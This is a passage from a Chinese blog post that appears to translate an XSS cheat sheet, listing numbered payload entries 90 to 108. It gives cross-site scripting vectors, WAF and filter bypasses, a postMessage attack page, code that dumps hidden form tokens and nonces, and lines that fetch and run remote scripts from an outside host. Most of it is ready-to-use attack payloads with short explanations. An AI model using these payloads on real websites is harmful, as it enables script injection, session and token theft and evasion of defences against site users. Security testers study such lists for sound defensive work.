οnlοad=function(){$.getScript('//brutelogic.com.br/2.js')}
οnlοad=x=>$.getScript('//brutelogic.com.br/2.js')
```

##### 90.Image Vectors - Alternative Event Handlers (图像向量-可选事件处理程序)

```
以下payload用于触发事件处理程序,不同于onerror事件。 

<img
<image
src=data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=
srcset=data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=
οnlοad=alert(1)>
onloadend=alert(1)>
οnlοadstart=alert(1)>

```

##### 91.Shortest XSS (最短XSS)

```
当有一个有限xss漏洞利用点时。需要一个javascript脚本调用，通过相对路径放在xss需要加载的位置之后。攻击者服务器必须使用攻击脚本对本机脚本（相同路径）或默认404页（更容易）内完成的确切请求进行响应。域名越短越好。 

<base href=//knoxss.me>
```

##### 92.Mobile-only Event Handlers (仅处理移动端应用)

```
以下payload,针对移动应用程序时使用。

<html ontouchstart=alert(1)>
<html ontouchend=alert(1)>
<html ontouchmove=alert(1)>
<body onorientatiοnchange=alert(1)>
```

##### 93.Body Tag (body 标签)

```
body标签的集合。最后一个只适用于Internet Explorer浏览器。

<body οnlοad=alert(1)>
<body οnpageshοw=alert(1)>
<body οnfοcus=alert(1)>
<body οnhashchange=alert(1)><meta content=URL;%23 http-equiv=refresh>
<body οnscrοll=alert(1) style=overflow:auto;height:1000px id=x>#x
<body οnscrοll=alert(1)><x id=x>#x
<body οnresize=alert(1)>press F12!
<body onhelp=alert(1)>press F1!
```

#### 0x06枚举

##### 94.Less Known XSS Vectors (未知的XSS向量)

```
未知的XSS向量的集合。 

<marquee onstart=alert(1)>
<audio src οnlοadstart=alert(1)>
<video οnlοadstart=alert(1)><source>
<video οntimeupdate=alert(1) controls src=//brutelogic.com.br/x.mp4>
<input autofocus οnblur=alert(1)>
<keygen autofocus οnfοcus=alert(1)>
<form οnsubmit=alert(1)><input type=submit>
<select οnchange=alert(1)><option>1<option>2
<menu id=x contextmenu=x οnshοw=alert(1)>right click me!
<object οnerrοr=alert(1)>
```

##### 95.Alternative PoC - Shake Your Body (非传统的xss payload)

```
以下payload用于摇动页面的所有元素，作为漏洞验证的良好可视化。

setInterval(x=>{b=document.body.style,b.marginTop=(b.marginTop=='4px')?'-4px':'4px';},5)
```

##### 96.Alternative PoC - Brutality (非传统的xss payload)

```
以下payload用于显示"Mortal Kombat’s Sub-Zero"角色的图像以及"brutality"的游戏声音。

d=document,i=d.createElement('img');i.src='//brutelogic.com.br/brutality.jpg';
d.body.insertBefore(i,d.body.firstChild);new(Audio)('//brutelogic.com.br/brutality.mp3').play();
```

##### 97.Alternative PoC - Alert Hidden Values (非传统的xss payload)

```
以下payload用于证明所有隐藏的HTML值（如目标页面中的标记和nonce）都可以被窃取。

f=document.forms;for(i=0;i<f.length;i++){e=f<i>.elements;for(n in e){if(e[n].type=='hidden')
{alert(e[n].name+': '+e[n].value)}}}
```

##### 98.Improved Likelihood of Mouse Events (提高鼠标事件的可能性)

```
以下payload用于创建要触发鼠标事件的更大区域范围。在任何使用鼠标事件（如onmouseover、onclick等）的XSS payload中添加以下内容（作为属性）。

style=position:fixed;top:0;left:0;font-size:999px
```

##### 99.Alternative to Style Tag (替代css样式标记)

```
以下payload用于当内联和标记名的"style"关键字被阻止时使用 

<link rel=stylesheet href=//HOST/FILE>
<link rel=stylesheet href=data:text/css,CSS>
```

##### 100.Cross-Origin Script - CrossPwn (跨源脚本-CrossPwn)

```
将下面的内容另存为.html文件，并按如下方式使用：

http://facebook.com.localhost/crosspwn.html?target=//brutelogic.com.br/tests/
status.html&msg=<script>alert(document.domain)
其中"facebook.com"是允许的来源，"localhost"正在攻击域  "//brutelogic.com.br/tests/status.html"是目标页和"<script>alert(document.domain)"是发送的消息（payload）。

code:

<!DOCTYPE html>
<body οnlοad="CrossPwn()">
<h2>CrossPwn</h2>
<p>OnMessage XSS</p>
<p>Use target & msg as URL parameters.</p>
<iframe id="f" height="0" style="visibility:hidden">
</iframe>
<script>
searchParams = new URLSearchParams(document.location.search);
target = searchParams.get('target');
msg = searchParams.get('msg');
document.getElementById('f').setAttribute('src', target);
function CrossPwn() {frames[0].postMessage(msg,'*')}
</script>
</body>
</html>
```

##### 101.Location Based Payloads (基于位置的有效载荷)

```
下面的XSS payload使用一种更详细的方法来执行负载，使用文档属性来提供另一个文档属性，即位置属性。这就产生了复杂的向量，对于绕过滤器和waf非常有用。因为它们使用任意标记（XHTML），所以可以使用前面看到的任何未知的事件处理程序。这里，"onmouseover"将用作默认值。在URL中将加号（＋）编码为%2B。

```

##### 102.Location Basics (位置基础知识)

```
payload与更简单的操作，以实现重定向到javascript伪协议。 

<j/οnmοuseοver=location=innerHTML>javascript:alert(1)//
<iframe id=t:alert(1) name=javascrip οnlοad=location=name+id>
```

##### 103.Location with URL Fragment (包含URL片段的位置)

```
如果在POST请求中需要使用带有未编码符号的payload。，URL必须在操作URL中使用片段。

<javascript/οnmοuseοver=location=tagName+innerHTML+location.hash>:/*hoverme!
</javascript>#*/alert(1)
<javascript/οnmοuseοver=location=tagName+innerHTML+location.hash>:'hoverme!
</javascript>#'-alert(1)
<javascript:'-`/οnmοuseοver=location=tagName+URL>hoverme!#`-alert(1)
<j/οnmοuseοver=location=innerHTML+URL>javascript:'-`hoverme!</j>#`-alert(1)
<javas/οnmοuseοver=location=tagName+innerHTML+URL>cript:'-`hoverme!</javas>
#`-alert(1)
<javascript:/οnmοuseοver=location=tagName+URL>hoverme!#%0Aalert(1)
<j/οnmοuseοver=location=innerHTML+URL>javascript:</j>#%0Aalert(1)
<javas/οnmοuseοver=location=tagName+innerHTML+URL>cript:</javas>#%0Aalert(1)
```

##### 104.Location with Leading Alert (最重要的弹窗位置)

```

`-alert(1)<javascript:`/
οnmοuseοver=location=tagName+previousSibling.nodeValue>hoverme!
`-alert(1)<javas/
οnmοuseοver=location=tagName+innerHTML+previousSibling.nodeValue>cript:`hoverme!
<alert(1)<!--/οnmοuseοver=location=innerHTML+outerHTML>javascript:1/*hoverme!*/
</alert(1)<!-->
<j/1="*/""-alert(1)<!--/οnmοuseοver=location=innerHTML+outerHTML>
javascript:/*hoverme!
*/"<j/1=/alert(1)//οnmοuseοver=location=innerHTML+
previousSibling.nodeValue+outerHTML>javascript:/*hoverme!
```

##### 105.Location with Self URL (last is FF Only) (具有self URL的位置（最后一个仅限FF）)

```
以下payload需要用使用输入的易受攻击的参数替换[P}。在URL中将&编码为%26。

<svg id=?[P]=<svg/οnlοad=alert(1)+ οnlοad=location=id>
<j/οnmοuseοver=location=textContent>?[P]=<svg/οnlοad=alert(1)>hoverme!</j>
<j/οnmοuseοver=location+=textContent>&[P]=<svg/οnlοad=alert(1)>hoverme!</j>
<j&[P]=<svg+οnlοad=alert(1)/οnmοuseοver=location+=outerHTML>hoverme!
</j&[P]=<svg+οnlοad=alert(1)>
&[P]=<svg/οnlοad=alert(1)><j/
οnmοuseοver=location+=document.body.textContent>hoverme!</j>
```

##### 106.Location with Template Literal (具有模板文本的位置)

```

${alert(1)}<javascript:`//οnmοuseοver=location=tagName+URL>hoverme!
${alert(1)}<j/οnmοuseοver=location=innerHTML+URL>javascript:`//hoverme!
${alert(1)}<javas/οnmοuseοver=location=tagName+innerHTML+URL>cript:`//hoverme!
${alert(1)}`<javascript:`//
οnmοuseοver=location=tagName+previousSibling.nodeValue>hoverme!
${alert(1)}`<javas/
οnmοuseοver=location=tagName+innerHTML+previousSibling.nodeValue>cript:`hoverme!
```

##### 107.Inner & Outer HTML Properties Alternative (内部和外部HTML属性选项)

```
最后这些payload利用元素的innerHTML和outerHTML属性得到与位置向量相同的结果。但是他们需要创建一个完整的HTML向量，而不是一个javascript:aler(1)字符串。下面的元素集合可以与索引0一起使用，它们都可以替换下面使用的head或body元素,以便更容易地遵循：all[0]、anchors[0],、embed[0]、forms[0]、images[0]、links[0]和scripts[0]。

<svg id=<img/src/onerror=alert(1)> οnlοad=head.innerHTML=id>
<svg id=<img/src/onerror=alert(1)> οnlοad=body.outerHTML=id>
```

##### 108.XSS Vector Schemes (XSS向量格式)

```
基本上有3种不同的方案来构建基于HTML的XSS向量。所有字符根据有效语法，用于分隔字段的字节显示在下拉列表中。 %x表示从%00到%0F的每个字节，以及%1X。ENT表示HTML实体,这意味着任何允许的字符或字节都可以在它们的HTML实体表单中使用（字符串和数字）。 最后，注意javascript这个词可能有一些字节介于两者之间  字符也可以是URL或HTML编码的。  Vector Scheme 1 (tag name + handler)

```

————————————————
版权声明：本文为CSDN博主「haoaaao」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/haoaaao/article/details/125553450



